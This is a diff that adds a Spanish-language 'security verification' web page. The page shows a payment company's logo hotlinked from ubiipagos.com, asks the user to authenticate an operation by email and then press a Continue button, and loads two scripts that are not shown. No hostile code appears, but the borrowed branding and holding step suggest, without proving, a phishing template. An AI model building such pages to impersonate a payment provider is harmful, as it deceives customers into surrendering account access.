@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación de Seguridad</title>
+    <style>
+        /* Fondo gris claro y centrado absoluto */
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f5f7fa;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        /* Tarjeta contenedor (Ventana emergente) */
+        .verification-card {
+            background-color: #ffffff;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            box-sizing: border-box;
+        }
+
+        /* NUEVO: Contenedor para el Logotipo superior */
+        .logo-container {
+            margin-bottom: 15px; /* Espacio entre el logo y el icono de abajo */
+        }
+
+        /* NUEVO: Estilo para controlar la imagen del logo */
+        .logo-container img {
+            max-width: 150px;   /* Define el ancho máximo que deseas para tu logo */
+            height: auto;       /* Mantiene la proporción de la imagen */
+            display: inline-block;
+        }
+
+        /* Icono o elemento visual inferior */
+        .icon-container {
+            margin-bottom: 20px;
+            color: #0076ff;
+        }
+
+        /* Mensaje informativo */
+        .message-text {
+            color: #333333;
+            font-size: 16px;
+            line-height: 1.5;
+            margin-bottom: 25px;
+        }
+
+        /* Botón de acción */
+        .btn-continue {
+            width: 100%;
+            padding: 12px;
+            background-color: #0076ff;
+            color: #ffffff;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .btn-continue:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="verification-card">
+
+        <div class="logo-container">
+            <img src="https://ubiionline.ubiipagos.com/LogoUbiiOnline.svg" alt="Logotipo de la empresa">
+        </div>
+
+        <div class="icon-container">
+            <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" viewBox="0 0 16 16">
+                <path d="M0 4a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2zm2-1a1 1 0 0 0-1 1v.217l7 4.2 7-4.2V4a1 1 0 0 0-1-1zm13 2.383-4.708 2.825L15 11.105zm-.034 6.876-5.64-3.471L8 9.583l-1.326-.795-5.64 3.47A1 1 0 0 0 2 13h12a1 1 0 0 0 .966-.741zM1 11.105l4.708-2.897L1 5.383z"/>
+            </svg>
+        </div>
+
+        <p class="message-text">Le hemos enviado un mensaje a su correo electrónico para autentificar esta operación por favor revisa su bandeja de correo electrónico luego de haber autentificado esta operación predele al botón continuar.</p>
+
+        <form id="correoForm">
+            <button type="submit" class="btn-continue">Continuar</button>
+        </form>
+    </div>
+
+    <script src="utils.js"></script>
+    <script src="correo_script.js"></script>
+</body>
+</html>
